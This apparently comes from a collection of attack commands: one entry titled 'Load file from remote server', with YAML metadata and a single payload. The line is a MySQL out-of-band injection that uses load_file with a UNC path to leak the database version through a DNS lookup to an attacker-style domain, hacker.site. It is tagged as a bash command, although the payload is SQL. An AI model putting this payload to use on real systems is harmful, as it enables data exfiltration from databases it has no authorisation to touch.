---
id: 4ddf1b40-daba-42da-9ca5-04b1fbfb7ee3
name: Load file from remote server
type: command
executor: bash
data: select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
output: null
created_at: '2023-04-06T03:56:35.033564+00:00'
updated_at: '2023-04-10T20:22:53.482257+00:00'
---

# Load file from remote server

```bash
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```


